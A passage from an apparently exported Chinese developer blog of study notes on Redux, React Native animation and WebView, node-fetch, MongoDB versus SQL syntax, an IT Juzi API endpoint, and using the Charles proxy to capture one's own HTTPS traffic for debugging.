是纯函数，而纯函数是指：输入、输出数据流全是显式的，函数与外界交换数据只有一个唯一通道 —— 参数和返回值，并且它应该是无副作用的。 什么是无副作用？ 下面 Array.slice 是无副作用的，而 Array.splice 是有副作用的。 12345let arr = [1, 3, 5];arr.slice(1, 2);// =&gt; arr [1, 3, 5]arr.splice(1, 1);// =&gt; arr [1, 5] 所以在 reducer 里永远不要做这些操作： 修改传入参数 执行有副作用的操作，如 API请求和路由转跳 调用非纯函数，如 Date.now() 或 Math.random() statestate 指的是组件的状态，它是一棵庞大的树。遵从单一数据源的原则，装载着整个应用的状态值。 StoreStore 是个全局的对象，将 action 和 reducer 以及 state 联系在一起。Store 有以下职能： 维持应用的 state。 提供 getState() 方法获取 state。 提供 dispatch(action) 方法更新 state。 通过 subscribe(listener) 注册监听器。 关系可以用这一张图来表示它们之间的关系。方向是从 dispatch 开始到 view 结束。 使用 Store介绍 Store 的基本使用。 类比学习：dispatch，subscribe 可以看成是一个事件的 emit 与 on。 创建创建 Store 需要从 redux 包中导入 createStore 这个方法，并使用 reducer 纯函数作为一个参数： 语法： createStore(reducer, [initialState]) 12import &#123; createStore &#125; from 'redux';const Store = createStore(_reducer); 如果需要传入state的初始值，则在第二个参数里传入： 1234const Store = createStore(_reducer, &#123; user: 'aer', name: 'aer',&#125;); 获取创建完 Store，你需要使用 Store.getState() 来获取 state。 1const state = Store.getState(); 监听你还需要使用 Store.subscribe(cb) 来监听 state 的变化。subscribe 会在使用了 action 并经过 reducer 处理后触发，此时的 state 是最新的。 1234Store.subscribe(() =&gt; &#123; const state = Store.getState(); console.log(state);&#125;); 实例实现如图的效果： reducer 123456789101112const _reducer = (state, action) =&gt; &#123; const than = &#123; 'Click': () =&gt; &#123; return &#123; ...state, click_count: state.click_count + 1, &#125;; &#125;, &#125;[action.type]; return typeof than === 'function' ? than() : state;&#125;; Store 1234import &#123; createStore &#125; from 'redux';const Store = createStore(_reducer, &#123; click_count: 0,&#125;); 容器 1234567891011const Box = (props) =&gt; ( &lt;div&gt; &lt;button className=&#123;`btn blue`&#125; onClick=&#123;() =&gt; Store.dispatch(&#123; type: 'Click' &#125;)&#125; &gt; button &lt;/button&gt; &lt;p&gt;click count: &#123;props.store.click_count&#125;&lt;/p&gt; &lt;/div&gt;); App 123456789101112131415161718192021class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; store: Store.getState(), &#125;; Store.subscribe(() =&gt; &#123; const state = Store.getState(); console.log(state); // this 指向 App this.setState(&#123; store: state &#125;); &#125;); &#125; render = () =&gt; ( &lt;Box store=&#123;this.state.store&#125; /&gt; );&#125; 复合写法1234567891011121314151617import &#123; createStore, applyMiddleware, compose, combineReducers&#125; from 'redux';import thunk from 'redux-thunk';import * as reducers from './reducers';export default store = createStore( combineReducers(&#123; ...reducers, &#125;), compose( applyMiddleware(thunk) ),); 参考资料 http://www.redux.org.cn/docs/api/index.html","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"React Native 动画 Animated","slug":"React Native/Animated/React Native 动画 Animated","date":"2017-02-18T14:52:31.000Z","updated":"2021-06-15T06:10:52.852Z","comments":true,"path":"/stories/2017/02/React Native/Animated/React Native 动画 Animated/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/React Native/Animated/React Native 动画 Animated/","excerpt":"Animated在 CSS3 中创建动画使用：animation，而在 React Native 中创建动画则是使用 Animated。 使用 Animated 需要三个步骤： 使用 new Animated.value(0); 初始化，动画值。 使用 &lt;Animated.View&gt; 包裹动画视图，并设置它的 style。 使用 Animated.timing(attr, { … }).start()等; 设置动画参数，并启动。","text":"Animated在 CSS3 中创建动画使用：animation，而在 React Native 中创建动画则是使用 Animated。 使用 Animated 需要三个步骤： 使用 new Animated.value(0); 初始化，动画值。 使用 &lt;Animated.View&gt; 包裹动画视图，并设置它的 style。 使用 Animated.timing(attr, { … }).start()等; 设置动画参数，并启动。 示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import React, &#123; Component &#125; from 'react';import &#123; AppRegistry, StyleSheet, Text, View, Easing, Animated,&#125; from 'react-native';export default class Demo extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; fadeInOpacity: new Animated.Value(0) // 初始值 &#125; &#125; componentDidMount() &#123; Animated.timing(this.state.fadeInOpacity, &#123; toValue: 1, // 目标值 duration: 2500, // 动画时间 easing: Easing.linear // 缓动函数 &#125;).start(); // 启动动画 &#125; render() &#123; return ( &lt;Animated.View style=&#123;[ styles.demo, &#123; opacity: this.state.fadeInOpacity &#125; ]&#125; &gt; &lt;Text style=&#123;styles.text&#125;&gt;悄悄的，我出现了&lt;/Text&gt; &lt;/Animated.View&gt; ); &#125;&#125;);const styles = StyleSheet.create(&#123; demo: &#123; flex: 1, alignItems: 'center', justifyContent: 'center', backgroundColor: 'white', &#125;, text: &#123; fontSize: 30 &#125;&#125;); 这样就产生了一个渐变效果。 单个动画创建单个动画，使用 Animated.timing 12345678910this.state = &#123; fadeInOpacity: new Animated.Value(0)&#125;;// ...Animated.timing(this.state.fadeInOpacity, &#123; toValue: 1, duration: 2500, easing: Easing.linear,&#125;).start(); 注意：this.state.fadeInOpacity 是一个由 Animated.value 创建出来的对象。 多个动画多个动画，需要使用到 Animated.parallel 12345678910111213141516this.state = &#123; fadeInOpacity: new Animated.Value(0), rotation: new Animated.Value(0), fontSize: new Animated.Value(0),&#125;;// ...Animated.parallel( ['fadeInOpacity', 'rotation', 'fontSize'].map(property =&gt; &#123; return Animated.timing(this.state[property], &#123; toValue: 1, duration: 2000, easing: Easing.linear, &#125;); &#125;)).start(); 动画循环Animated 的 start 方法是支持回调函数的，在动画或某个流程结束的时候执行，这样子就可以很简单地实现循环动画了。 123456789startAnimation() &#123; this.state.rotateValue.setValue(0); Animated.timing(this.state.rotateValue, &#123; toValue: 1, duration: 800, easing: Easing.linear &#125;).start(() =&gt; this.startAnimation());&#125; 插值函数使用 interpolate 可以实现了数值大小、单位的映射转换。比如： 123456789101112131415161718192021222324this.state = &#123; rotation: new Animated.value(0),&#125;;//...Animated.timing(this.start.rotation, &#123; toValue: 1, duration: 2000, easing: Easing.linear,&#125;);// 将 0 - 1 映射到 0deg - 360degrotateZ: this.state.rotation.interpolate(&#123; inputRange: [0, 1], outputRange: ['0deg', '360deg']&#125;);// 将 0 - 1 映射到 0 - 100pxtransform: [&#123; translateY: this.state.move.interpolate(&#123; inputRange: [0, 1], outputRange: [0, 100], &#125;),&#125;] 参考资料 http://www.alloyteam.com/2016/01/reactnative-animated/","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Nodejs fetch 的使用","slug":"Nodejs/Nodejs fetch 的使用","date":"2017-02-17T01:53:21.000Z","updated":"2021-06-15T06:10:52.836Z","comments":true,"path":"/stories/2017/02/Nodejs/Nodejs fetch 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/Nodejs/Nodejs fetch 的使用/","excerpt":"Fetch之前在 React.js 上用过 fetch.js。在 React Native 上用过自带的 Fetch 。感觉 Fetch 非常好用，它的 API 非常的友好。 而在 Nodejs 上一直都是使用着原生的 HTTP 模块，最后还自己封装了一个。不得不说原生的 HTTP 模块的自由度非常灵活，但是每次使用的时候，你都要自己去封装一下，这样显得非常麻烦。 突然，今天逛 Github 的时候发现了node-fetch，它是 Fetch 在 Nodejs 上的实现，API 完全一致。","text":"Fetch之前在 React.js 上用过 fetch.js。在 React Native 上用过自带的 Fetch 。感觉 Fetch 非常好用，它的 API 非常的友好。 而在 Nodejs 上一直都是使用着原生的 HTTP 模块，最后还自己封装了一个。不得不说原生的 HTTP 模块的自由度非常灵活，但是每次使用的时候，你都要自己去封装一下，这样显得非常麻烦。 突然，今天逛 Github 的时候发现了node-fetch，它是 Fetch 在 Nodejs 上的实现，API 完全一致。 安装1npm install node-fetch --save 引入1const fetch = require('node-fetch'); 基本使用简单的说一下基本的使用，更多的去参考官方文档。 text1234fetch('https://github.com/') .then(res =&gt; res.text()) .then(body =&gt; console.log(body)) .catch(err =&gt; console.error(err)); json1234fetch('https://api.github.com/users/github') .then(res =&gt; res.json()) .then(json =&gt; console.log(json)) .catch(err =&gt; console.error(err)); post注意 body 需要用 JSON.stringify 序列化为字符串。 12345678fetch('http://httpbin.org/post', &#123; method: 'POST', body: JSON.stringify(&#123; name: 'xiaoming', &#125;), &#125;) .then(res =&gt; res.json()) .then(json =&gt; console.log(json)); post with json123456789fetch('http://httpbin.org/post', &#123; method: 'POST', body: JSON.stringify(&#123; name: 'xiaoming', &#125;), headers: &#123; 'Content-Type': 'application/json' &#125;, &#125;) .then(res =&gt; res.json()) .then(json =&gt; console.log(json)); post with form-data模拟表单数据 123456789101112// 安装 Form Data 模块const FormData = require('form-data');const form = new FormData();form.append('name', 'xiaoming');fetch('http://httpbin.org/post', &#123; method: 'POST', body: form &#125;) .then(res =&gt; res.json()) .then(json =&gt; console.log(json)); bufferbuffer() 是 node-fetch 特有的 API，其他的 Fetch 没有这个 API。 123456const fileType = require('file-type');fetch('https://assets-cdn.github.com/images/modules/logos_page/Octocat.png') .then(res =&gt; res.buffer()) .then(buffer =&gt; fileType(buffer)) .then(type =&gt; console.log(type)); Stream流，在是非常有用了，它可以提供性能，并且不需要把整个文件下载到内存里，才保存到磁盘上。 读入流： 123456789import &#123; createReadStream &#125; from 'fs';// 创建一个可读流const stream = createReadStream('input.txt');// 发送文件fetch('http://httpbin.org/post', &#123; method: 'POST', body: stream &#125;) .then(res =&gt; res.json()) .then(json =&gt; console.log(json)); 写入流： 1234567891011121314import &#123; createReadStream &#125; from 'fs';fetch('https://assets-cdn.github.com/images/modules/logos_page/Octocat.png') .then(res =&gt; &#123; // 创建一个可写流 const dest = fs.createWriteStream('./octocat.png'); dest.on('end', () =&gt; &#123; console.log('end'); &#125;); // 接上 res.body res.body.pipe(dest); &#125;); 参考资料 https://github.com/bitinn/node-fetch","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"网络请求","slug":"网络请求","permalink":"http://me.lizhooh.com/tags/网络请求/"}]},{"title":"MongoDB 与 SQL（MySQL）语法比较","slug":"MongoDB/MongoDB 与 SQL（MySQL）语法比较","date":"2017-02-14T07:58:07.000Z","updated":"2021-06-15T06:10:52.826Z","comments":true,"path":"/stories/2017/02/MongoDB/MongoDB 与 SQL（MySQL）语法比较/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/MongoDB/MongoDB 与 SQL（MySQL）语法比较/","excerpt":"MongoDBMongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。其次 MongoDB 是一个 NOSQL，与 Mysql 这些 SQL 数据库有着不一样的地方。","text":"MongoDBMongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。其次 MongoDB 是一个 NOSQL，与 Mysql 这些 SQL 数据库有着不一样的地方。 数据储存差异MongoDB 与 Mysql 的存储方式结构是不同的。Mysql 数据存储以表为单元，即一个二维结构，而 MongoDB 的数据存储以文档为单元，即一个多维结构。 Mysql 储存格式： MongoDB 储存格式： 12345678910&#123; \"_id\" : \"59d26405cc8a855b9cdb9711\", \"name\" : \"小明\", \"age\" : 20, \"sex\" : \"男\", \"email\" : [ \"123214@qq.com\", \"asddd@163.com\", ]&#125; Select因为 Mysql 在查询时需要作 SQL 语法树的解析，如果 SQL 非常复杂，在 SQL 解析上也是需要一定的时间的。而 MongoDB 提供了独特的基于对象的查询语法，几乎是瞬间完成了查询条件的判断，在性能上比 Mysql 更加高效。 下面是 MongoDB 的查询语句与 Mysql 的查询语句进行对比。 查询表12345-- MysqlSELECT * FROM users-- MongoDBdb.users.find(); 查询属性123456789-- MysqlSELECT id, user_id, status FROM users Where status = \"A\"-- MongoDBdb.users.find( &#123; status: 'A' &#125;, -- 查询条件 &#123; user_id: 1, status: 1 &#125; -- 筛选条件); 不显示某个属性12345678-- MysqlSELECT user_id, status FROM users-- MongoDBdb.users.find( &#123; &#125;, &#123; user_id: 1, status: 1, _id: 0 &#125;); 条件查询123456-- MysqlSELECT * FROM users WHERE status = \"A\"-- MongoDBdb.users.find(&#123; status: \"A\" &#125;); 123456789-- MysqlSELECT user_id, status FROM users WHERE status = \"A\"-- MongoDBdb.users.find( &#123; status: \"A\" &#125;, &#123; user_id: 1, status: 1, _id: 0 &#125;); 非12345678-- MysqlSELECT * FROM users WHERE status != \"A\"-- MongoDBdb.users.find(&#123; status: &#123; $ne: \"A\" &#125;&#125;); 与123456-- MysqlSELECT * FROM users WHERE status = \"A\" AND age = 50-- MongoDBdb.users.find(&#123; status: \"A\", age: 50 &#125;); 或1234567891011-- MysqlSELECT * FROM users WHERE status = \"A\" OR age = 50-- MongoDBdb.users.find(&#123; $or: [ &#123; status: \"A\" &#125;, &#123; age: 50 &#125;, ]&#125;); 大于，小于123456-- MysqlSELECT * FROM users WHERE age &gt; 25-- MongoDBdb.users.find(&#123; age: &#123; $gt: 25 &#125; &#125;); 123456-- MysqlSELECT * FROM users WHERE age &lt; 25-- MongoDBdb.users.find(&#123; age: &#123; $lt: 25 &#125; &#125;); 1234567891011-- MysqlSELECT * FROM users WHERE age &gt; 25 AND age &lt;= 50-- MongoDBdb.users.find(&#123; age: &#123; $gt: 25, $lte: 50, &#125;&#125;); LIKE123456-- MysqlSELECT * FROM users WHERE user_id LIKE \"%bc%\"-- MongoDBdb.users.find(&#123; user_id: /bc/ &#125;); 123456-- MysqlSELECT * FROM users WHERE user_id LIKE \"bc%\"-- MongoDBdb.users.find(&#123; user_id: /^bc/ &#125;); Order by 排序1234567-- MysqlSELECT * FROM users WHERE status = \"A\" ORDER BY user_id ASC-- MongoDBdb.users.find(&#123; status: \"A\" &#125;).sort(&#123; user_id: 1 &#125;); 1234567-- MysqlSELECT * FROM users WHERE status = \"A\" ORDER BY user_id DESC-- MongoDBdb.users.find(&#123; status: \"A\" &#125;).sort(&#123; user_id: -1 &#125;); Count1234567-- MysqlSELECT COUNT(*) FROM users-- MongoDBdb.users.count();-- ordb.users.find().count(); 12345678-- MysqlSELECT COUNT(*) FROM users WHERE age &gt; 30-- MongoDBdb.users.count(&#123; age: &#123; $gt: 30 &#125; &#125;);-- ordb.users.find(&#123; age: &#123; $gt: 30 &#125; &#125;).count(); Distinct 去重复12345-- MysqlSELECT DISTINCT(status) FROM users-- MongoDBdb.users.distinct(\"status\"); Limit 行数12345-- MysqlSELECT * FROM users LIMIT 1-- MongoDBdb.users.find().limit(1); Skip 跳过12345-- MysqlSELECT * FROM users LIMIT 5 SKIP 10-- MongoDBdb.users.find().limit(5).skip(10); Explain 显示查询信息123456-- MysqlEXPLAIN SELECT * FROM users WHERE status = \"A\"-- MongoDBdb.users.find(&#123; status: \"A\" &#125;).explain(); Insert123456789101112-- MysqlInsert Into users(name, age) Values(\"小明\", 20),(\"小美\", 19),(\"小东\", 21);-- MongoDBdb.users.insert([ &#123; name: '小明', age: 20 &#125;, &#123; name: '小美', age: 19 &#125;, &#123; name: '小东', age: 21 &#125;,]); Update12345678910-- MysqlUpdate users Set name = \"新小明\", age = 21 Where name = \"小明\"-- MongoDBdb.users.update( &#123; name: '小明' &#125;, &#123; name: '新小明', age: 21 &#125;); Delete123456-- MysqlDelete From users Where name = \"新小明\"-- MongoDBdb.users.remove(&#123; name: '新小明' &#125;); 参考资料 https://docs.mongodb.com/manual/reference/sql-comparison/ https://www.mongodb.com/compare/mongodb-mysql?jmp=docs","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"React Native WebView 自适应高度","slug":"React Native/React Native WebView 自适应高度","date":"2017-02-14T01:54:19.000Z","updated":"2021-06-15T06:10:52.860Z","comments":true,"path":"/stories/2017/02/React Native/React Native WebView 自适应高度/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/React Native/React Native WebView 自适应高度/","excerpt":"WebView在 ReactNative 项目中可能会遇到展示 HTML 代码的情况，通常我们会采用 WebView 来展示 HTML 代码，但 ReactNative 中的 WebView 需要设定高度才能展示出来。因此并不让 WebView 与 ScrollView 结合在一起使用。","text":"WebView在 ReactNative 项目中可能会遇到展示 HTML 代码的情况，通常我们会采用 WebView 来展示 HTML 代码，但 ReactNative 中的 WebView 需要设定高度才能展示出来。因此并不让 WebView 与 ScrollView 结合在一起使用。 为了让它自适应高度，我通过嵌入 Javascript 到 WebView 的 html 里，让它去计算文档的高度，再改变 url 地址，触发 onNavigationStateChange 事件 注意注意的是，不要使用 onload 等事件监控，页面加载完成，因为这样会有被重写的可能。更新，可以使用 addEventListener 123window.addEventListener('load', function(event) &#123; // do someing&#125;, false); 最好是使用查询 12345678910(function __isComplete() &#123; if (document.readyState == \"complete\" &amp;&amp; document.documentElement.offsetWidth &gt; 0) &#123; window.location.hash = 1; document.title = document.body.clientHeight; &#125; else &#123; setTimeout(__isComplete, 30); &#125;&#125;)(); 示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091export default class WebviewAutoHeight extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; height: 0, &#125;; &#125; static defaultProps = &#123; css: '', htmlStyle: '', body: null, onloadHTML: () =&gt; &#123; &#125;, &#125;; static propTypes = &#123; css: PropTypes.oneOfType([ PropTypes.array, PropTypes.string, ]), body: PropTypes.string, htmlStyle: PropTypes.string, onloadHTML: PropTypes.func, &#125;; render() &#123; let css; if (Array.isArray(this.props.css)) &#123; css = this.props.css.map(it =&gt; `&lt;link href=\"$&#123;it&#125;\" rel=\"stylesheet /&gt;`).join('\\n'); &#125; else if (typeof this.props.css === 'string') &#123; css = `&lt;link href=\"$&#123;this.props.css&#125;\" rel=\"stylesheet\" /&gt;`; &#125; const body = this.props.body; const html = ` &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"/&gt; &lt;meta content=\"width=device-width, initial-scale=1.0, user-scalable=0;\" name=\"viewport\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" /&gt; $&#123;css&#125; &lt;/head&gt; &lt;body&gt; $&#123;body&#125; &lt;script&gt; (function __isComplete() &#123; if (document.readyState == \"complete\" &amp;&amp; document.documentElement.offsetWidth &gt; 0) &#123; window.location.hash = 1; document.title = document.body.clientHeight; &#125; else &#123; setTimeout(__isComplete, 30); &#125; &#125;)(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; `; // 下面是WebView的代码。`$&#123;&#125;`这个ES6中新加入的特性，允许通过反引号 ` 来创建字符串 // 获取高度原理是当文档加载完后js获取文档高度然后添加到title标签中。 // 这时通过监听导航状态变化的函数 `onNavigationStateChange` // 来将 title 的值读取出来赋值给 this.state.height 从而使 webview 的高度做到自适应。 return ( &lt;WebView domStorageEnabled=&#123;true&#125; javaScriptEnabled=&#123;true&#125; scalesPageToFit=&#123;false&#125; style=&#123;&#123; height: this.state.height &#125;&#125; source=&#123;&#123; html: html &#125;&#125; onNavigationStateChange=&#123;(document) =&gt; &#123; if (document.title) &#123; this.props.onloadHTML(document); if (this.state.height === document.title) return; this.setState(&#123; height: parseInt(document.title) + 50, &#125;); &#125; &#125; &#125; /&gt; ); &#125;&#125; 如果是 url 呢？如果 source 使用的是 url，使用 injectedJavaScript注入那段 js 代码。 React Native 与 WebView 通信实现也可以通过 React Native 与 WebView 通信，等页面渲染完毕后，发送通知给 React-Native。 其中 WebView 向 React Native 发送信息使用：window.postMessage(str)，这个属性会强制覆盖 web 页面上的同名属性。 123456789101112(function __isComplete() &#123; if (document.readyState == \"complete\" &amp;&amp; document.documentElement.offsetWidth &gt; 0) &#123; var height = document.body.clientHeight; window.postMessage &amp;&amp; window.postMessage(height); &#125; else &#123; setTimeout(__isComplete, 30); &#125;&#125;)(); 也可以使用： 123window.addEventListener('load', function(event) &#123; // do someing&#125;, false); 需要在 WebView 上使用 onMessage(event) 来监听：数据都存在：event.nativeEvent.data 1234567onMessage=&#123;event =&gt; &#123; // data is string ( string * 1 =&gt; number ) const height = event.nativeEvent.data * 1; this.setState(&#123; height: height + 50, &#125;);&#125;&#125;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 解析 HTML","slug":"React Native/React Native 解析 HTML","date":"2017-02-11T02:06:05.000Z","updated":"2021-06-15T06:10:52.866Z","comments":true,"path":"/stories/2017/02/React Native/React Native 解析 HTML/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/React Native/React Native 解析 HTML/","excerpt":"React Native 解析 HTML有时候需要直接在 React Native 里面写 HTML 而不全是 JSX，这时候需要用到一些第三方的组件（其实是可以自己写的，不过需要大量的正则）。 在 NPM 上搜索了一把发现两个组件相对比较好： react-native-htmlview react-native-fence-html","text":"React Native 解析 HTML有时候需要直接在 React Native 里面写 HTML 而不全是 JSX，这时候需要用到一些第三方的组件（其实是可以自己写的，不过需要大量的正则）。 在 NPM 上搜索了一把发现两个组件相对比较好： react-native-htmlview react-native-fence-html 安装 it12npm install --save react-native-htmlviewnpm install --save react-native-fence-html 使用需求就是要解析 HTML，使用起来还是相对的简单的。 htmlview示例代码： 12345678910111213141516171819202122232425262728var React = require('react');var ReactNative = require('react-native');var &#123;Text, View, ListView&#125; = ReactNative;var HTMLView = require('react-native-htmlview');var styles = StyleSheet.create(&#123; a: &#123; fontWeight: '300', color: '#FF3366', // pink links &#125;,&#125;);var App = React.createClass(&#123; render: () =&gt; &#123; var htmlContent = '&lt;p&gt;&lt;a href=\"http://jsdf.co\"&gt;&amp;hearts; nice job!&lt;/a&gt;&lt;/p&gt;'; return ( &lt;HTMLView // 需要渲染的 HTML value=&#123;htmlContent&#125; // HTML 的 CSS stylesheet=&#123;styles&#125; /&gt; ); &#125;&#125;); fence-html示例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647var HTML = require('react-native-fence-html');// ...render() &#123; // The html you want to render const html = ' &lt;div&gt; &lt;h1&gt;A Sample H1 Title&lt;/h1&gt; &lt;h2&gt;A Sample H2 Title&lt;/h2&gt; ... &lt;/div&gt; '; const styles = &#123; h1: &#123; backgroundColor: '#FF0000' &#125;, h2: &#123; fontFamily: 'Arial' &#125;, img: &#123; resizeMode: 'cover' &#125; &#125;; const renderers = &#123; img: (htmlattr, children, passProps) =&gt; &#123; return ( &lt;Image source=&#123;&#123;uri: htmlattr.src, width: 100, height: 100&#125;&#125; style=&#123;passProps.htmlStyles.img&#125; &#123;...passProps&#125; /&gt; ); &#125; &#125;; return ( &lt;HTML // 需要渲染的 HTML 结构 html=&#123;html&#125; // 设置 HTML 的 CSS htmlStyles=&#123;styles&#125; // 点击链接时的回调函数 onLinkPress=&#123;(evt, href) =&gt; console.log(href)&#125; // 渲染器用于渲染特定的HTML元素。 // 默认渲染 HTMLRenderers.js. renderers=&#123;renderers&#125; /&gt; );&#125; 参考资料 https://github.com/jsdf/react-native-htmlview https://github.com/Thomas101/react-native-fence-html","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"IT 桔子网爬虫","slug":"抓包&爬虫/IT 桔子网爬虫","date":"2017-02-07T13:17:47.000Z","updated":"2021-06-15T06:10:52.916Z","comments":true,"path":"/stories/2017/02/抓包&爬虫/IT 桔子网爬虫/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/抓包&爬虫/IT 桔子网爬虫/","excerpt":"","text":"前言API实际上并没有爬，只是找出了对应的调用 API。 获取公司列表页：https://www.itjuzi.com/api/companys JSON 参数： 123456789101112131415&#123; \"city\": \"\", \"location\": \"\", \"page\": 1, \"pagetotal\": 120449, \"per_page\": 20, \"prov\": \"\", \"round\": \"\", \"scope\": \"\", \"selected\": \"\", \"sort\": \"\", \"status\": \"\", \"sub_scope\": \"\", \"total\": 0&#125;","categories":[{"name":"抓包","slug":"抓包","permalink":"http://me.lizhooh.com/categories/抓包/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"抓包","slug":"抓包","permalink":"http://me.lizhooh.com/tags/抓包/"}]},{"title":"Charles 抓取 HTTPS 数据包","slug":"抓包&爬虫/Charles 抓取 HTTPS 数据包","date":"2017-02-07T13:17:47.000Z","updated":"2021-06-15T06:10:52.916Z","comments":true,"path":"/stories/2017/02/抓包&爬虫/Charles 抓取 HTTPS 数据包/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/抓包&爬虫/Charles 抓取 HTTPS 数据包/","excerpt":"CharlesCharles 是在 Windows/Mac 下常用的截取网络封包的工具，在做 android/iOS 开发时，我们为了调试与服务器端的网络通讯协议，常常需要截取网络封包来分析。Charles 通过将自己设置成系统的网络访问代理服务器，使得所有的网络访问请求都通过它来完成，从而实现了网络封包的截取和分析。 下载：https://www.charlesproxy.com/download/ Charles4 主要的功能包括： 截取 Http 和 Https 网络封包。 支持重发网络请求，方便后端调试。 支持修改网络请求参数。 支持网络请求的截获并动态修改。 支持模拟慢速网络。 支持 Http 2。 支持 IPv6。","text":"CharlesCharles 是在 Windows/Mac 下常用的截取网络封包的工具，在做 android/iOS 开发时，我们为了调试与服务器端的网络通讯协议，常常需要截取网络封包来分析。Charles 通过将自己设置成系统的网络访问代理服务器，使得所有的网络访问请求都通过它来完成，从而实现了网络封包的截取和分析。 下载：https://www.charlesproxy.com/download/ Charles4 主要的功能包括： 截取 Http 和 Https 网络封包。 支持重发网络请求，方便后端调试。 支持修改网络请求参数。 支持网络请求的截获并动态修改。 支持模拟慢速网络。 支持 Http 2。 支持 IPv6。 设置代理打开proxy设置代理 设置端口打开proxy -&gt; proxy setting 过滤网络请求 在Sequence处设置过滤 过滤网络请求 在proxy -&gt; Recording Settings设置只显示某个主机的包 过滤网络请求 安装 SSL打开help -&gt; SSL Proxying -&gt; Install...，安装 SSL。点击安装证书，一直按确认，安装在根目录下 移动端安装证书在手机上浏览器输入网站：http://www.charlesproxy.com/getssl/弹出框，输入证书名称，随便输一个即可，之后授权信任，安装 SSL 证书。 移动端设置代理手机要和电脑连上同一个路由器（同一个局域网） 开始抓包在手机随便打开 APP/浏览器，在 Charles 上就可以看到有数据包抓取到 抓取 HTTPS 包HTTPS 包是可以抓到了，但是里面的内容被加密了，显示的东西都是乱码。要解密就有使用 SSL 证书 右击链接，点击 Enable SSL 或者，在proxy SSL Proxying处设置 之后设置完上面之后，就可以愉快的抓取 HTTP，HTTPS 的数据包了。","categories":[{"name":"抓包","slug":"抓包","permalink":"http://me.lizhooh.com/categories/抓包/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"抓包","slug":"抓包","permalink":"http://me.lizhooh.com/tags/抓包/"}]},{"title":"React 非直接关系组件传递数据","slug":"React/React/React 非直接关系组件传递数据","date":"2017-02-01T00:58:46.000Z","updated":"2021-06-15T06:10:52.879Z","comments":true,"path":"/stories/2017/02/React/React/React 非直接关系组件传递数据/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/React/React/React 非直接关系组件传递数据/","excerpt":"单向数据流在 React 中，数据是沿着组件树从上到下单向流动的。拥有数据的组件并不一定负责显示该数据，它经常把自己拥有的数据作为一个子组件的属性传递给子组件，由子组件来显示它。","text":"单向数据流在 React 